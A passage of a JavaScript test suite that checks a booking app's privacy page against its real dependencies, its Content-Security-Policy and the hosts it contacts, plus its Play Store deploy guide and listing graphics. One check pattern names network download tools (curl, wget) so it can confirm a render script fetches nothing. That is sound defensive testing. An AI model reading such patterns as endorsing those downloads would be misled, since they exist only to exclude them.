  // It is the declaration the owner signs, and the repository is public: a sentence anyone can disprove from
  // package.json in a minute is a policy problem however harmless the libraries are.
  ok(!/third-party code of any kind/i.test(visible) && !/no software kits?/i.test(visible) && !/no third parties/i.test(visible),
    'it does NOT claim "no third-party code of any kind": both native apps ship the Capacitor framework and its plugins, and the Android build links AndroidX');
  ok(/open-source Capacitor framework and its plugins/.test(visible) && /AndroidX/.test(visible) && /contact no one/.test(visible), '…it says what the apps are built with, and that those libraries run on the device and contact no one');
  let nativeDeps = [];
  try { nativeDeps = Object.keys(JSON.parse(read('ios-app/package.json')).dependencies || {}); } catch (e) { nativeDeps = ['(ios-app/package.json could not be read)']; }
  ok(nativeDeps.length >= 5, 'ios-app/package.json lists what the native apps ship (' + nativeDeps.length + ' packages)');
  eq(nativeDeps.filter((d) => !/^@capacitor\/[a-z-]+$/.test(d) && d !== '@ebarooni/capacitor-calendar'), [], '…and that sentence is the whole of it: Capacitor, its own plugins and the one calendar plugin — a dependency of any other kind changes the policy page FIRST');
  ok(/nothing from the app itself/.test(visible) && /aggregated install, crash and performance figures/.test(visible) && /agreed to share diagnostics with Apple or Google/.test(visible),
    '…the publisher receives nothing from the APP; what the App Store and Google Play give every publisher (the runbook tells the owner to read Android vitals) is said too, not denied');
  ok(/reads the coming events in your device's calendars and looks only at its own/.test(visible) && !/reads that calendar only/.test(visible),
    '…the calendar read is described as wide as it is: the plugin lists the coming events of EVERY calendar, and the bridge then keeps its own (nothing leaves the device)');
  ok(!/only if you ask for reminders/.test(visible) && /On Android 12 and earlier the system has no notification permission/.test(visible) && /until you switch Class reminders off/.test(visible),
    '…and notifications are not said to need a yes where they do not: on Android 12 and earlier there is no permission to refuse, so reminders and the countdown are on from the first booking until Class reminders are switched off');

  // "To Psycle and nowhere else" — held where it is ENFORCED. The app shells' connect-src is the control: js/app.js
  // keeps a file:// development branch through a public CORS proxy (the owner's closed decision, agents/decisions.md
  // section 6), which would carry the bearer token; no shipped shell is file://, and this directive blocks it.
  const cspOf = (html) => (/<meta http-equiv="Content-Security-Policy" content="([^"]*)"/.exec(html) || [])[1] || '';
  const directive = (policy, name) => { const d = policy.split(';').map((x) => x.trim().split(/\s+/)).filter((x) => x[0] === name)[0]; return d ? d.slice(1) : null; };
  eq([directive("default-src 'self'; connect-src 'self' https://a.example; img-src *", 'connect-src'), directive("default-src 'self'", 'connect-src')], [["'self'", 'https://a.example'], null], '(the policy reader finds a directive\'s sources, and says when there is none)');
  const API_ORIGIN = 'https://psycle.codexfit.com';
  eq(['psycle-finder.html', 'ios-app/www/psycle-finder.html'].map((f) => directive(cspOf(read(f)), 'connect-src')), [["'self'", API_ORIGIN], ["'self'", API_ORIGIN]],
    'the app shell (and its generated copy in the native apps) may connect to itself and to ' + API_ORIGIN + ' — EXACTLY: one relaxed source here and the published promise is false with every other suite green');
  eq(['login.html', 'ios-app/www/login.html'].map((f) => directive(cspOf(read(f)), 'connect-src')), [[API_ORIGIN], [API_ORIGIN]], '…the sign-in page to that origin alone');
  eq(['psycle-finder.html', 'login.html'].map((f) => (directive(cspOf(read(f)), 'default-src') || []).join(' ')), ["'self'", "'none'"], '…and neither falls back to anything wider (default-src \'self\' / \'none\')');
  // Every host a js/ file or the bridge names. A request can only go to the first; the rest are links a member
  // taps (a map, Google Calendar, Psycle's own site, an instructor's page, this policy on the web app's own host —
  // js/settings.js openPrivacyPolicy, for the native apps, which do not bundle the page), a namespace, and that ONE proxy.
  const KNOWN_HOSTS = ['calendar.google.com', 'corsproxy.io', 'instagram.com', 'maps.apple.com', 'muscaglar.github.io', 'psycle.codexfit.com', 'psyclelondon.com', 'www.google.com', 'www.w3.org'];
  const jsFiles = fs.readdirSync(abs('js')).filter((f) => /\.js$/.test(f)).map((f) => 'js/' + f).concat(['ios-app/www/native-bridge.js', 'sw.js']);
  const hostsNamed = Array.from(new Set(jsFiles.reduce((out, f) => out.concat((read(f).match(/https?:\/\/[A-Za-z0-9][A-Za-z0-9.-]*\.[A-Za-z]{2,}/g) || []).map((u) => u.replace(/^https?:\/\//, '').toLowerCase())), []))).sort();
  eq(hostsNamed.filter((h) => KNOWN_HOSTS.indexOf(h) === -1), [], 'js/, the bridge and sw.js name no host beyond the ones this policy accounts for — a new one is a change to privacy.html ("What is sent, and to whom") FIRST, then to this list');
  const appJs = read('js/app.js');
  ok(/const IS_FILE = location\.protocol === 'file:';/.test(appJs) && /return IS_FILE\s*\?\s*PROXY \+ encodeURIComponent\(DIRECT_API \+ path\)\s*:\s*DIRECT_API \+ path;/.test(appJs) && (appJs.match(/\bPROXY\b/g) || []).length === 2,
    '…and the proxy is reached in ONE place, only when the page was opened from file:// (apiUrl): never by a hosted page, never by either app');
  ok(/Calendar/.test(visible) && /Notifications/.test(visible) && /no push server/i.test(visible), 'it explains the calendar and notification permissions');
  ok(/Sign out/.test(visible) && /Uninstalling/i.test(visible) && /Psycle's to delete/i.test(visible), 'it says how to delete everything, and what is Psycle\'s to delete');
  ok(/Children/.test(visible) && /Changes to this policy/.test(visible) && /Last updated: \d{1,2} [A-Z][a-z]+ \d{4}/.test(visible), 'it has a children section, a changes section and a dated "Last updated"');
  ok(/Google backups?/i.test(visible) && /phone-to-phone/i.test(visible), 'it says the Android app\'s data is kept out of Google backups and transfers');
  ok(visible.indexOf('!') === -1, 'house style: no exclamation mark in its text');

  // The same first paint as login.html, the same token values, the same mark.
  const bootOf = (html) => ((/<script id="themeBoot">([\s\S]*?)<\/script>/.exec(html) || [])[1] || '').split('\n').filter((l) => !/^\s*\/\//.test(l)).join('\n').replace(/\s+/g, ' ').trim();
  const login = read('login.html');
  ok(bootOf(page).length > 200 && bootOf(page) === bootOf(login), 'its themeBoot is login.html\'s, statement for statement (comments aside)');
  ok(page.indexOf('<meta name="theme-color"') !== -1 && page.indexOf('<meta name="theme-color"') < page.indexOf('<script id="themeBoot">') && page.indexOf('<script id="themeBoot">') < page.indexOf('<style>'), '…after the theme-color meta it rewrites, before the styles');
  const tokensOf = (html, theme) => {
    const body = (new RegExp('\\[data-theme="' + theme + '"\\]\\s*\\{([^}]*)\\}').exec(html) || [])[1] || '';
    return (body.match(/--[\w-]+\s*:\s*[^;]+/g) || []).reduce((out, d) => { const i = d.indexOf(':'); out[d.slice(0, i).trim()] = d.slice(i + 1).trim(); return out; }, {});
  };
  const THEMES = ['cloud', 'graphite', 'terminal', 'gameboy', 'blueprint'];
  const drift = [];
  THEMES.forEach((theme) => {
    const mine = tokensOf(page, theme), theirs = tokensOf(login, theme);
    if (Object.keys(mine).length < 6) drift.push(theme + ': too few tokens');
    Object.keys(mine).forEach((k) => { if (theirs[k] !== mine[k]) drift.push(theme + ' ' + k + ': ' + mine[k] + ' ≠ ' + theirs[k]); });
  });
  eq(drift, [], 'every token it declares, in all five themes, has login.html\'s value');
  const paths = (src) => (src.match(/\bd="M[^"]+"/g) || []).map((d) => d.slice(3, -1));
  const logoPaths = paths(read('assets/psync-logo.svg')).sort();
  const brandAt = page.indexOf('<div class="brand">');
  eq(paths(page.slice(brandAt, page.indexOf('</div>', brandAt))).sort(), logoPaths, 'it draws the mark with assets/psync-logo.svg\'s four paths');

  // Reachable on the hosted site; not part of the app shell.
  const shellOf = (sw) => ((/const\s+SHELL\s*=\s*\[([\s\S]*?)\];/.exec(sw) || [])[1] || '');
  ok(shellOf(read('sw.js')).length > 100 && !/privacy/.test(shellOf(read('sw.js'))) && !/privacy/.test(shellOf(read('ios-app/www/sw.js'))), 'neither sw.js copy precaches it (the generated SHELL lists do not name it)');
  ok(!has('ios-app/www/privacy.html') && !/privacy/.test(read('ios-app/build.js')), 'ios-app/build.js does not know it, so it is not copied into ios-app/www/ and is not part of the CACHE hash');
  ok(has('.nojekyll'), 'the repository root is published as it is (.nojekyll), so the page is served beside psycle-finder.html');

  // ── E. The owner's guide ───────────────────────────────────────────────────────────────────────
  t.section('Play release: the deploy guide names the workflow, the secrets and the privacy page, and quotes real figures of this project');
  ok(has(GUIDE), GUIDE + ' exists');
  const guide = read(GUIDE);
  const wfName = (/^name: (.*)$/m.exec(raw) || [])[1] || '';
  ok(wfName.length > 5 && guide.indexOf('`' + WORKFLOW + '`') !== -1 && guide.indexOf('**' + wfName + '**') !== -1, 'it names the workflow by file and by the name the Actions tab shows ("' + wfName + '")');
  eq(SECRETS.filter((n) => guide.indexOf('`' + n + '`') === -1), [], 'it names the four secrets exactly');
  eq(gradleVars.filter((n) => guide.indexOf('`' + n + '`') === -1), [], '…and the four variables app/build.gradle reads');
  eq(SECRETS.filter((n) => raw.split('\n').filter((l) => /^#/.test(l)).join('\n').indexOf(n) === -1), [], '…which the workflow\'s own header lists too, by name only');
  ok(/`privacy\.html`/.test(guide) && /id="publisher"/.test(guide) && /support@ajar\.dev/.test(guide) && /`support\.html`/.test(guide), 'it names the privacy page, the element that holds the publisher and the contact address, and the support page beside it');
  eq(['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'].filter((n) => !new RegExp('^## ' + n + '\\. ', 'm').test(guide)), [], 'it has its ten numbered steps, 0 to 9');
  ok(/check the current figure in Play Console/i.test(guide) && (guide.match(/check|read the current|confirm/gi) || []).length >= 8, 'it tells the owner to check Google\'s current figures, more than once');
  const target = (/targetSdkVersion\s*=\s*(\d+)/.exec(read('ios-app/android/variables.gradle')) || [])[1];
  ok(!!target && guide.indexOf('`targetSdkVersion = ' + target + '`') !== -1, 'the target API level it quotes (' + target + ') is the one ios-app/android/variables.gradle has — when the upgrade lands, this step of the guide changes with it');
  ok(/UPGRADE-CAPACITOR-8\.md/.test(guide) && /Route A/.test(guide) && /Route B/.test(guide) && /Recommendation: Route A/.test(guide), 'it sets out both routes to the target level and recommends one');
  ok(/not affiliated/i.test(guide) && /Impersonation/.test(guide) && /Intellectual property/.test(guide) && /written permission from Psycle/i.test(guide), 'it states the policy risk of an unofficial client, and what the only real protection is');
  ok(/keytool -genkeypair[^\n]*-keyalg RSA -keysize (?:2048|3072|4096)[^\n]*-validity \d{4,}/.test(guide) && /Play App Signing/.test(guide) && /upload key reset/i.test(guide), 'the keytool command (RSA, 2048 bits or more, a long validity), Play App Signing, and what to do when the key is lost');
  eq(((/keytool -genkeypair[^\n]*/.exec(guide) || [''])[0] === (/keytool -genkeypair[^\n]*/.exec(read('ios-app/ANDROID.md')) || [''])[0]), true, '…the same command ANDROID.md gives');
  ok(/versionCode/.test(guide) && /must be higher/i.test(guide) && /gh secret set PSYNC_KEYSTORE_BASE64/.test(guide) && /base64 /.test(guide), 'versionCode must rise; how to base64 the keystore into the secret');
  ok(/App access/.test(guide) && /Data safety/.test(guide) && /Content rating/.test(guide) && /Target audience/.test(guide) && /Internal testing/.test(guide) && /Closed testing/.test(guide) && /pre-launch report/i.test(guide) && /Android vitals/.test(guide),
    'App access, data safety, content rating, target audience, the testing tracks, the pre-launch report and vitals are all there');
  ok(/1080 × 1920/.test(guide) && /512 × 512/.test(guide) && /1024 × 500/.test(guide) && /appstore-shots\.mjs --play/.test(guide) && /render-play-assets\.sh/.test(guide), 'the graphics sizes, and the two commands that build them');
  ok(/service account/i.test(guide) && /Not automated, on purpose/.test(guide), 'an automated upload is described as a later option with its risks — not done');
  ok(days > 0 && guide.indexOf('**' + days + ' days**') !== -1, 'it says how long the bundle is kept (' + days + ' days), as the workflow has it');
  const environment = (/\n {4}environment: ([\w-]+)\n/.exec(wf) || [])[1] || '';
  ok(!!environment && guide.indexOf('`' + environment + '`') !== -1 && /Deployment branches/.test(guide) && /required reviewer/.test(guide), 'the job names an environment ("' + environment + '"), and the guide says how to move the secrets into it, limit it to main and require an approval');
  // The privacy page's address is DERIVED: <owner>.github.io/<repository>/, from the repository CICD.md names.
  const repo = (/repos\/([\w.-]+)\/([\w.-]+)\/commits/.exec(read('ios-app/CICD.md')) || []);
  ok(!!repo[1] && guide.indexOf('https://' + repo[1] + '.github.io/' + repo[2] + '/privacy.html') !== -1 && /Settings → Pages/.test(guide), 'the privacy page\'s public address is the GitHub Pages address of the repository CICD.md names, and the owner is told where to confirm it');
  if (tracked) eq(tracked.filter((f) => /(?:^|\/)CNAME$/.test(f)), [], '…whose premise holds: no CNAME file sets a custom domain');
  const prose = guide.replace(/```[\s\S]*?```/g, ' ').replace(/`[^`\n]*`/g, ' ');
  ok(prose.indexOf('!') === -1 && !/[\u{1F300}-\u{1FAFF}\u{2600}-\u{27BF}]/u.test(guide), 'house style: no exclamation mark and no emoji in its prose');
  ok(!/\b(?:1[0-2]|0?[1-9])(?::[0-5]\d)? ?(?:am|pm)\b/i.test(prose), '…and no 12-hour time');
  ok(read('ios-app/ANDROID.md').indexOf('(PLAY_STORE_DEPLOY.md)') !== -1 && read('ios-app/PLAY_STORE_LISTING.md').indexOf('`PLAY_STORE_DEPLOY.md`') !== -1, 'ANDROID.md and PLAY_STORE_LISTING.md point at it');
  ok(read('ios-app/PLAY_STORE_LISTING.md').indexOf('`privacy.html`') !== -1 && !/change\s+"iOS Keychain\/Preferences"/.test(read('ios-app/PLAY_STORE_LISTING.md')), '…and the listing names the privacy page instead of a template still to be edited');

  // ── F. The listing graphics ────────────────────────────────────────────────────────────────────
  t.section('Play release: the icon, the feature graphic, the render script and the --play screenshot canvas');
  const ICON = 'ios-app/playstore-assets/icon-512.png', FEATURE = 'ios-app/playstore-assets/feature-graphic-1024x500.png';
  ok(has(ICON) && has(FEATURE), 'both graphics are committed under ios-app/playstore-assets/');
  if (has(ICON) && has(FEATURE)) {
    const icon = pngHeader(ICON), feature = pngHeader(FEATURE);
    eq([icon.png, icon.w, icon.h, icon.depth], [true, 512, 512, 8], 'the Play icon is a 512 × 512 PNG, 8 bits a channel');
    ok(icon.bytes <= 1024 * 1024, '…within Play\'s 1 MB (' + icon.bytes + ' bytes)');
    eq([feature.png, feature.w, feature.h, feature.depth, feature.colour], [true, 1024, 500, 8, 2], 'the feature graphic is a 1024 × 500 PNG in plain RGB: colour type 2, NO alpha channel');
    ok(fs.readFileSync(abs(ICON)).equals(fs.readFileSync(abs('icons/icon-512.png'))), 'the Play icon is byte for byte the web app\'s 512 px icon: one drawing, one renderer');
  }
  const shots = has('ios-app/playstore-assets') ? fs.readdirSync(abs('ios-app/playstore-assets')).filter((f) => /^\d\d-[\w-]+\.png$/.test(f)).sort() : [];
  if (shots.length) {
    eq(shots.map((f) => { const p = pngHeader('ios-app/playstore-assets/' + f); return [p.w, p.h, p.colour].join(' '); }).filter((s) => s !== '1080 1920 2'), [], 'every Play screenshot that is there (' + shots.length + ') is 1080 × 1920 with no alpha channel');
    ok(shots.length >= 2 && shots.length <= 8, '…and there are between 2 and 8 of them');
  } else {
    console.log('  · no Play screenshots yet in ios-app/playstore-assets/: `node tests/tools/appstore-shots.mjs --play` builds them (it needs Chrome)');
  }
  const svg = read('assets/psync-play-feature.svg');
  ok(/viewBox="0 0 1024 500"/.test(svg) && /<rect width="1024" height="500" fill="#12161F"\/>/.test(svg), 'assets/psync-play-feature.svg: a 1024 × 500 canvas on the Graphite ground, edge to edge (an opaque picture has no alpha)');
  const svgPaths = paths(svg);
  eq(svgPaths.filter((d) => logoPaths.indexOf(d) !== -1).sort(), logoPaths, '…it carries the icon\'s four paths unchanged');
  eq(svgPaths.length, 5, '…and ONE more: the wordmark');
  ok(/<path id="psync-wordmark"[^>]*\bd="M[^"]{1500,}"/.test(svg) && !/<text\b|font-family|<image\b|href=|<style|@font-face|<script/i.test(svg), '…as OUTLINES: no text element, no font, no image, nothing referenced — any renderer draws the same picture');
  ok(!/psycle/i.test(svg), '…and nothing of Psycle\'s is in it');
  const render = read('assets/render-play-assets.sh');
  ok(/^#!\/bin\/sh\n/.test(render) && /\nset -e\n/.test(render) && /rsvg-convert -w 512 -h 512 assets\/psync-logo\.svg -o "\$OUT\/icon-512\.png"/.test(render) &&
    /rsvg-convert -w 1024 -h 500 assets\/psync-play-feature\.svg -o "\$OUT\/feature-graphic-1024x500\.png"/.test(render) && /\nOUT=ios-app\/playstore-assets\n/.test(render),
    'assets/render-play-assets.sh renders both, from those two sources, into ios-app/playstore-assets/');
  ok(!/chrome|curl|wget|npm |npx /i.test(uncomment(render)), '…with rsvg-convert alone: no browser, no download');
  if (process.platform !== 'win32' && has('assets/render-play-assets.sh')) ok((fs.statSync(abs('assets/render-play-assets.sh')).mode & 0o111) !== 0, '…and it is executable, as render-icons.sh is');

  const tool = read('tests/tools/appstore-shots.mjs');
  ok(/const PLAY = process\.argv\.includes\('--play'\);/.test(tool), 'tests/tools/appstore-shots.mjs has a --play mode');
  const canvas = (key) => {
    const m = new RegExp("\\{ out: '" + key + "', raw: \\[(\\d+), (\\d+)\\], page: \\[(\\d+), (\\d+)\\], dpr: (\\d+), px: \\[(\\d+), (\\d+)\\] \\}").exec(tool);
    return m ? m.slice(1).map(Number) : [];
  };
  const play = canvas('playstore-assets'), store = canvas('appstore-assets');
  eq(store, [390, 844, 430, 932, 3, 1290, 2796], 'the App Store canvas is what it always was: a 390 × 844 capture in a 430 × 932 page at 3× = 1290 × 2796');
  eq([play[2] * play[4], play[3] * play[4], play[5], play[6]], [1080, 1920, 1080, 1920], 'the Play canvas is 1080 × 1920: a ' + play[2] + ' × ' + play[3] + ' page at ' + play[4] + '×');
  ok(play[6] <= 2 * play[5] && store[6] > 2 * store[5], '…inside Play\'s 2-to-1 limit, which the iPhone canvas is not — the reason the mode exists');
  ok(/PLAY\s*\n?\s*\? \{ out: 'playstore-assets'/.test(tool) && /const OUT = join\(ROOT, 'ios-app', CANVAS\.out\);/.test(tool), '…written to ios-app/playstore-assets/ ONLY under --play: the App Store files are never overwritten');
  const framePlay = (/const framePlay = [^`]*`([\s\S]*?)`;/.exec(tool) || [])[1] || '';
  const frameStore = (/const frame = [^`]*`([\s\S]*?)`;/.exec(tool) || [])[1] || '';
  ok(framePlay.length > 400 && new RegExp('width:' + play[2] + 'px;height:' + play[3] + 'px').test(framePlay), 'the Play picture is composed on a page of exactly that size');
  ok(!/iphone|ipad|\bios\b|apple|app store|testflight/i.test(framePlay) && !/class="dev"|border-radius:4\dpx/.test(framePlay), '…with no phone drawn round the capture and no Apple wording');
  ok(/width:430px;height:932px/.test(frameStore) && /class="dev"/.test(frameStore) && /border-radius:44px/.test(frameStore), 'the App Store frame is untouched');
  ok(/\(PLAY \? framePlay : frame\)\(name, title, sub\)/.test(tool) && /CANVAS\.raw\[0\], CANVAS\.raw\[1\], CANVAS\.dpr/.test(tool) && /CANVAS\.page\[0\], CANVAS\.page\[1\], CANVAS\.dpr/.test(tool), 'one run loop serves both canvases');
  ok(/if \(PLAY\) \{\n[\s\S]*?pngSize\([\s\S]*?throw new Error/.test(tool), 'under --play a file of any other size fails the run');
  ok(/leaks=\[1-9\]\|live=\[1-9\]/.test(tool) && /fake-psycle\.js/.test(tool), 'either way the pictures come from the fake server, and traffic towards the live API fails the run');
};
